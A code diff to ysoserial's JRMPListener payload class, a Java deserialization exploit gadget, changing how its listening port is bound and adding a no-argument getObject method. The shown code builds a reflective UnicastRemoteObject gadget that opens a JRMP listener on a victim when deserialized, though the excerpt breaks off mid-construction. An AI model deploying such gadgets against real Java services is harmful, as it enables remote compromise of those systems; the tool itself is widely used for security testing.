@@ -7,6 +7,8 @@ import java.rmi.server.UnicastRemoteObject;
 
 import sun.rmi.server.ActivationGroupImpl;
 import sun.rmi.server.UnicastServerRef;
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -35,9 +37,18 @@ import ysoserial.payloads.util.Reflections;
 } )
 @PayloadTest( skip = "This test would make you potentially vulnerable")
 public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
+	
+	@Bind private int jrmpPort;
 
-    public UnicastRemoteObject getObject ( final String command ) throws Exception {
-        int jrmpPort = Integer.parseInt(command);
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public UnicastRemoteObject getObject ( final String command ) throws Exception {
+		return getObject();
+	}
+
+
+	public UnicastRemoteObject getObject ( ) throws Exception {
         UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
             RemoteRef.class
         }, new Object[] {
